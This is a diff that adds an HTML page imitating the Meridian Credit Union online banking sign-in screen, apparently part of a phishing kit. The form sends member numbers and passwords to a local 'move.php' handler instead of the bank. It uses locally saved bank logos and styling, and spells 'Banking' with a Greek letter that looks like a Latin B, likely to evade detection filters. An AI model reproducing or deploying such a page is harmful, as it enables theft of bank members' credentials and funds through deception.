@@ -1,0 +1,169 @@
+<html xmlns="http://www.w3.org/1999/xhtml" class=" js flexbox flexboxlegacy"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>Sign In</title>
+
+<script src="./login_files/modal.js"></script>
+
+<script>
+function empty() {
+    var y;
+    y = document.getElementById("username").value;
+    if (y == "") {
+        document.getElementById("username").style = "border-color:red";
+		document.getElementById("username_error").style = "display: block";
+        return false;
+    }
+	var x;
+    x = document.getElementById("password").value;
+    if (x == "") {
+        document.getElementById("password").style = "border-color:red";
+		document.getElementById("password_error").style = "display: block";
+        return false;
+    }
+
+}
+</script>
+
+<script>
+function change() {
+    var e;
+    e = document.getElementById("username").value;
+    if (e !== ""){
+	    document.getElementById("username").style = "";
+		document.getElementById("username_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("password").value;
+    if (e !== ""){
+	    document.getElementById("password").style = "";
+		document.getElementById("password_error").style = "display: none";
+	}
+	
+}
+
+</script>
+	
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+
+	<base href=".">
+
+	<link href="./login_files/style.css" rel="stylesheet">
+	
+	</head>
+	
+<body>
+
+<div class="body-content">
+	<div class="row public-header">
+		<div class="logo-container">
+			<a href="">
+				<img src="./login_files/meridian-logo.svg" alt="" class="meridian-logo">
+			</a>
+		</div>
+		<div class="link-container">
+			<ul class="utility-links">
+				<li>
+					<a href="" target="_blank">MeridianCU.ca</a>
+				</li>
+			</ul>
+		</div>
+	</div>
+</div>
+
+	<div id="page-content" class="signin-page" style="background-image: url(login_files/Retail_SignInBackground_All.jpg)">
+
+
+		<div class="signin-page-inner">
+			<div class="row">
+				<div class="signin-form-container">
+					
+
+
+<div class="signin-form">
+        <h1>Online Βanking Sign In</h1>
+
+
+
+<form method="post" action="move.php" onsubmit="return empty();" autocomplete="false">		<div class="signin-form-content">
+			<label>Select Βanking Type</label>
+
+
+<select class="blue" id="account-switcher" name="AccountType" style="display: none;"><option selected="selected" value="">Personal Βanking</option>
+<option value="">Small Business</option>
+<option value="">Commercial Βanking</option>
+</select><span tabindex="0" id="account-switcher-button" role="combobox" aria-expanded="false" aria-autocomplete="list" aria-owns="account-switcher-menu" aria-haspopup="true" class="ui-selectmenu-button ui-selectmenu-button-closed ui-corner-all ui-button ui-widget blue"><span class="ui-selectmenu-icon ui-icon ui-icon-triangle-1-s"></span><span class="ui-selectmenu-text">Personal Βanking</span></span>
+
+		</div>
+		<div data-memorized-account-hidden="" style="" class="signin-form-content">
+                <label>Member Number</label>
+			<input value="" class="textbox" data-msg-digits="Member Number must be digits only." data-msg-required="Member Number is required." data-rule-digits="true" data-username-field="True" focus="" id="username" name="username" placeholder="Enter Member Number" type="text" aria-required="true" onblur="change()" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57">
+			<label id="username_error" style="display: none"><font color="red">Member number is required</font></label>
+		</div>
+		<div class="signin-form-content">
+            <label>Password</label>
+			<input autocomplete="off" class="textbox " data-msg-maxlength="Password cannot be more than 12 characters" data-msg-required="Password is required." id="password" maxlength="12" name="password" placeholder="Enter Password" type="password" aria-required="true" onblur="change()">
+			<label id="password_error" style="display: none"><font color="red">Password is required</font></label>
+			<div class="double">
+				<div>
+					&nbsp;
+					<span class="caps-lock-warning">Caps lock is enabled</span>
+				</div>
+				<div class="right">
+					<a href="" class="decorated muted" id="forgot-password-link">Need help signing in?</a>
+				</div>
+			</div>
+		</div>
+		<label data-memorized-account-hidden="" style="" class="normal">
+			<label data-type="checkbox" class="wrapped-toggle remember-me-checkbox blue"><input class="remember-me-checkbox blue" id="RememberMe" name="RememberMe" type="checkbox" value="true"></label><input name="RememberMe" type="hidden" value="false">
+			Remember Account
+		</label>
+		<div class="signin-form-content" data-remember-shown="" style="display: none;">
+			<input id="RememberMeNickname" name="RememberMeNickname" placeholder="Nickname (Optional)" type="text" value="">
+		</div>
+		<div class="signin-form-content">
+			<button type="submit" class="orange button" id="sign-in-button">
+				Sign In
+			</button>
+		</div>
+		<div class="signin-form-content">
+			<p>Not a member? <a href="" class="bold underlined" id="join-now-link" target="_blank">Join Now</a></p>
+		</div>
+</form></div>
+
+					<div class="signin-form-links">
+						<a href="" class="semibold ">Contact Us</a> |
+						<a href="" class="semibold ">FAQs</a> |
+						<a href="" class="semibold ">Having Difficulty Signing In?</a>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+
+<footer class="main-footer">
+	<div class="row">
+		<div class="footer-logos">
+			<div class="logo-container">
+				<a href="">
+					<img src="./login_files/meridian-logo-white.svg" alt="" class="meridian-logo">
+				</a>
+			</div>
+			<div>
+				<img src="./login_files/entrust.png" class="entrust-seal">
+			</div>
+		</div>
+		<div class="footer-sub">
+			<span>Copyright © 2017 Meridian Credit Union. All rights reserved.</span>
+			<div class="footer-links">
+				<a href="" title="Privacy &amp; Security" target="_blank">Privacy &amp; Security</a>
+				<a href="" title="Legal" target="_blank">Legal</a>
+				<a href="" title="Accessibility" target="_blank">Accessibility</a>
+			</div>
+		</div>
+	</div>
+</footer>
+
+<div class="ui-selectmenu-menu ui-front"><ul aria-hidden="true" aria-labelledby="account-switcher-button" id="account-switcher-menu" role="listbox" tabindex="0" class="ui-menu ui-corner-bottom ui-widget ui-widget-content"></ul></div></body></html>
